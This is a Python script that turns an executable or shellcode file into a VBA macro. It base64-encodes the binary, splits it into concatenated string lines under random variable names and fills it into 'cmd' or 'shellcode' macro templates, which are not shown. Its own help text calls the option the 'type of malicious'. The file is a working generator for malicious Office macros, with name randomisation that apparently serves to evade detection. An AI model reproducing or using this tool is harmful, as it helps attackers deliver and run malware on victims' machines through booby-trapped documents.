import random
import base64
import string
import argparse


def randomString(stringLength=8):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def base64EncodeBin(filename, var_name):
    with open(filename, 'rb') as f:
        bytes_ = f.read()
    str_ = str(base64.b64encode(bytes_), 'utf-8')
    # print(str_)
    x = 80
    res = [str_[y-x:y] for y in range(x, len(str_)+x, x)]
    str_buf = ''
    str_buf += var_name + ' = '
    for i in range(len(res)):
        str_buf += '"' + res[i]+'"\n'
        if i != len(res)-1:
            str_buf += var_name+' = '+var_name+' & '
    return str_buf

    # print(str_buf)

    # for c in res:
    #     # str_buf += c + ' _\n'
    #     str_buf += '"'+ c+'"\n'
    #     str_buf +=var_name+' = '+var_name+' & '
    # with open('split.txt','w') as f:
    #     f.write(str_buf)


def generateCmdBase(filename):
    var_name = randomString()
    exe_filename = randomString()
    base64_code = base64EncodeBin(filename, var_name)
    with open('cmd_template.vba', 'r', encoding='utf-8') as f:
        template = f.read()
    template = template.format(
        var_name=var_name, base64_code=base64_code, exe_filename=exe_filename)
    # print(template)
    return template


def generateShellCodeBase(filename):
    var_name = randomString()
    base64_code = base64EncodeBin(filename, var_name)
    with open('shellcode_template.vba', 'r', encoding='utf-8') as f:
        template = f.read()
    template = template.format(var_name=var_name, base64_code=base64_code)
    # print(template)
    return template


parser = argparse.ArgumentParser()
parser.add_argument(
     '-t','--type', help='type of malicious, using cmd or shellocde',metavar='type',type=str)
parser.add_argument(
     '-o','--output',help='output filename, if this option not be specified, the result will be print to stdout',metavar='output')
parser.add_argument('bin', help='binary file to be encoded')
args = parser.parse_args()
if args.type == 'cmd':
    macro = generateCmdBase(args.bin)
elif args.type == 'shellcode':
    macro = generateShellCodeBase(args.bin)
else:
    print('unknown type!')
    exit()
if args.output:
    with open(args.output,'w') as f:
        f.write(macro)
else:
    print(macro)
